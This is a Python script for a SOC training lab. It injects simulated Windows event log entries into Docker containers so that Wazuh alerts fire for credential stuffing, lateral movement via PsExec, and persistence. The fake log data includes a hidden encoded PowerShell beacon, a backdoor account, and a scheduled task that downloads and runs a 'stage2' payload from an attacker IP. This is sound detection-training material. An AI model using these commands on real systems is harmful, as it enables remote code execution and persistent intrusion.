#!/usr/bin/env python3
"""
SOC Lab — Windows Station Attack Simulator
Injects malicious Windows Event Log entries into target containers.
Run: python attacks/attack_windows.py
"""

import json
import subprocess
import time
from datetime import datetime, timezone
import random

ATTACKER_IP = "185.220.101.47"  # Tor exit node IP (realistic external attacker)


def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000000000Z")


def inject(container, events):
    lines = "\n".join(json.dumps(e) for e in events) + "\n"
    cmd = ["docker", "exec", "-i", container, "bash", "-c",
           "cat >> /var/log/win-eventlog.json"]
    subprocess.run(cmd, input=lines.encode(), check=True)


# ── HR-LAPTOP-01 Attack: Credential Stuffing + Successful Login ──────────────

def attack_hr_laptop():
    container = "win-workstation-01"
    computer  = "HR-LAPTOP-01"
    target_user = "hsmith"          # HR employee account
    print(f"\n[*] Attacking {computer} — credential stuffing + successful login")

    # 12 failed logon attempts (triggers brute force rule)
    failed = []
    for _ in range(12):
        failed.append({"win": {"system": {
            "providerName": "Microsoft-Windows-Security-Auditing",
            "eventID": "4625",
            "level": "0", "task": "12544",
            "keywords": "0x8010000000000000",
            "systemTime": ts(),
            "computer": computer,
            "channel": "Security",
        }, "eventdata": {
            "targetUserName": target_user,
            "ipAddress": ATTACKER_IP,
            "logonType": "3",
            "failureReason": "%%2313",
            "status": "0xc000006d",
            "subStatus": "0xc000006a",
        }}})

    inject(container, failed)
    print(f"  [+] 12 failed logons injected → brute force rule should fire")
    time.sleep(2)

    # Successful login after failures
    success = [{"win": {"system": {
        "providerName": "Microsoft-Windows-Security-Auditing",
        "eventID": "4624",
        "level": "0", "task": "12544",
        "keywords": "0x8020000000000000",
        "systemTime": ts(),
        "computer": computer,
        "channel": "Security",
    }, "eventdata": {
        "targetUserName": target_user,
        "ipAddress": ATTACKER_IP,
        "logonType": "3",
        "logonProcessName": "NtLmSsp",
        "authenticationPackageName": "NTLM",
    }}}]

    inject(container, success)
    print(f"  [+] Successful logon injected → account compromise alert")
    time.sleep(1)

    # Attacker runs encoded PowerShell after gaining access
    ps_attack = [{"win": {"system": {
        "providerName": "Microsoft-Windows-Sysmon",
        "eventID": "1",
        "level": "4", "task": "1",
        "keywords": "0x8000000000000000",
        "systemTime": ts(),
        "computer": computer,
        "channel": "Microsoft-Windows-Sysmon/Operational",
    }, "eventdata": {
        "image": "C:\\Windows\\System32\\powershell.exe",
        "commandLine": "powershell.exe -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
        "parentImage": "C:\\Windows\\explorer.exe",
        "user": f"{computer}\\{target_user}",
        "hashes": "MD5=7353F60B1739074EB17C5F4DDDEFE239",
    }}}]

    inject(container, ps_attack)
    print(f"  [+] Encoded PowerShell C2 beacon injected → suspicious execution alert")
    print(f"  [✓] HR-LAPTOP-01 attack complete")


# ── WEBDEV-WORKSATION-01 Attack: Lateral Movement via PsExec ─────────────────

def attack_webdev():
    container = "win-server-01"
    computer  = "WEBDEV-WORKSATION-01"
    pivot_host = "HR-LAPTOP-01"     # attacker pivoting FROM HR laptop
    print(f"\n[*] Attacking {computer} — lateral movement from {pivot_host}")

    # PsExec service installed on target (classic lateral movement indicator)
    psexec_svc = [{"win": {"system": {
        "providerName": "Service Control Manager",
        "eventID": "7045",
        "level": "4", "task": "0",
        "keywords": "0x8080000000000000",
        "systemTime": ts(),
        "computer": computer,
        "channel": "System",
    }, "eventdata": {
        "serviceName": "PSEXESVC",
        "imagePathName": "%SystemRoot%\\PSEXESVC.exe",
        "serviceType": "user mode service",
        "startType": "demand start",
        "accountName": "LocalSystem",
    }}}]

    inject(container, psexec_svc)
    print(f"  [+] PSEXESVC service install injected → lateral movement rule fires")
    time.sleep(1)

    # Attacker runs cmd via PsExec (PSEXESVC as parent process)
    remote_exec = [{"win": {"system": {
        "providerName": "Microsoft-Windows-Sysmon",
        "eventID": "1",
        "level": "4", "task": "1",
        "keywords": "0x8000000000000000",
        "systemTime": ts(),
        "computer": computer,
        "channel": "Microsoft-Windows-Sysmon/Operational",
    }, "eventdata": {
        "image": "C:\\Windows\\System32\\cmd.exe",
        "commandLine": "cmd.exe /c whoami && net localgroup administrators",
        "parentImage": "C:\\Windows\\PSEXESVC.exe",
        "user": f"{computer}\\SYSTEM",
        "hashes": "MD5=A6D71167840A5E23628E21C4F43C6AE6",
    }}}]

    inject(container, remote_exec)
    print(f"  [+] Remote cmd via PSEXESVC injected → execution under SYSTEM")
    time.sleep(1)

    # Backdoor user created on webdev server
    new_user = [{"win": {"system": {
        "providerName": "Microsoft-Windows-Security-Auditing",
        "eventID": "4720",
        "level": "0", "task": "13824",
        "keywords": "0x8020000000000000",
        "systemTime": ts(),
        "computer": computer,
        "channel": "Security",
    }, "eventdata": {
        "targetUserName": "webadmin_svc",
        "subjectUserName": "SYSTEM",
        "subjectDomainName": computer,
    }}}]

    inject(container, new_user)
    print(f"  [+] Backdoor user 'webadmin_svc' created → persistence alert")

    # Scheduled task for persistence
    schtask = [{"win": {"system": {
        "providerName": "Microsoft-Windows-Security-Auditing",
        "eventID": "4698",
        "level": "0", "task": "12804",
        "keywords": "0x8020000000000000",
        "systemTime": ts(),
        "computer": computer,
        "channel": "Security",
    }, "eventdata": {
        "taskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
        "subjectUserName": "webadmin_svc",
        "taskContent": "<Actions><Exec><Command>powershell.exe</Command>"
                       "<Arguments>-w hidden -c IEX(New-Object Net.WebClient)"
                       ".DownloadString('http://185.220.101.47/stage2')</Arguments></Exec></Actions>",
    }}}]

    inject(container, schtask)
    print(f"  [+] Malicious scheduled task injected → persistence rule fires")
    print(f"  [✓] WEBDEV-WORKSATION-01 attack complete")


# ── Main ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print("SOC Lab — Attacking HR-LAPTOP-01 and WEBDEV-WORKSATION-01")
    print(f"Attacker IP: {ATTACKER_IP}")
    print("=" * 60)

    attack_hr_laptop()
    attack_webdev()

    print("\n" + "=" * 60)
    print("Attack complete. Check Wazuh dashboard:")
    print("  https://localhost → Security Events")
    print("  Filter: agent.name: HR-LAPTOP-01")
    print("  Filter: agent.name: WEBDEV-WORKSATION-01")
    print("=" * 60)
